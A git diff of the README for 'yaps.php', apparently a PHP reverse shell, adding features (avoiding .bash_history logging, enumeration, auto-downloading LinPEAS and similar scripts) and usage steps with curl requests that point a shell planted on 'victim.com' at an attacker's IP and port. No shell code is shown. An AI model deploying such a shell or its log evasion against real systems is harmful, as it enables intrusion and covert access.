@@ -13,6 +13,7 @@ It's currently in its first version and I haven't tested it much yet, and there 
 * Single PHP file (no need to install packages, libs, or download tons of files)
 * Works with netcat, ncat, socat, multi/handler, almost any listener
 * Customizable password protection
+* No logs in .bash_history
 * Can do some enumeration
   * Network info (interfaces, iptables rules, active ports)
   * User info
@@ -22,12 +23,20 @@ It's currently in its first version and I haven't tested it much yet, and there 
   *  List writable PHP files
 * Auto download LinPEAS, LinEnum or Linux Exploit Suggester
 * Write and run PHP code on remote host
-* Stabilize shell
+* (Semi) Stabilize shell
 
 ## Cons
 * Connection isn't encrypted (nc does not support SSL)
 * Not interactive (although you can spawn an interactive shell with `!stabilize`)
   * CTRL+C breaks it; can't use arrows to navigate (unless you use `rlwrap`)
+
+## Usage
+1. Set up a TCP listener;
+2. Set your IP and port. This can be done by:
+* 2.1 Editing the variables at the start of the script;
+* 2.2 Setting them via web request (`curl -x POST -d "x=ip&y=post victim.com/yaps.php"` or `curl victim.com/yaps.php?x=ip&y=post`);
+3. Open yaps.php on browser or curl it;
+4. Hack!
 
 ## Working commands
 * `!help - Display the help menu`
@@ -41,13 +50,28 @@ It's currently in its first version and I haven't tested it much yet, and there 
 
 ## Screenshots
 
+![image](https://user-images.githubusercontent.com/3837916/124773354-45010700-df13-11eb-99c2-bce191425d01.png)
 
-## Credits  (add links)
+![image](https://user-images.githubusercontent.com/3837916/124777687-c4dca080-df16-11eb-94b7-ef77127c5f20.png)
 
-#### linpeas
+![image](https://user-images.githubusercontent.com/3837916/124775570-1b48df80-df15-11eb-8a3d-90090e8b8016.png)
 
-#### linenum
+![image](https://user-images.githubusercontent.com/3837916/124774830-7dedab80-df14-11eb-9e84-c8d88b9f4de2.png)
 
-#### suggester
+![image](https://user-images.githubusercontent.com/3837916/124776296-b641b980-df15-11eb-9a3c-396fe1544825.png)
 
-#### pentest monkey
+
+## Credits
+Some ideas were inspired by this tools:
+
+#### Linpeas
+https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS
+
+#### Linenum
+https://github.com/rebootuser/LinEnum
+
+#### Suggester
+https://github.com/AonCyberLabs/Windows-Exploit-Suggester
+
+#### Pentest Monkey
+https://github.com/pentestmonkey/php-reverse-shell
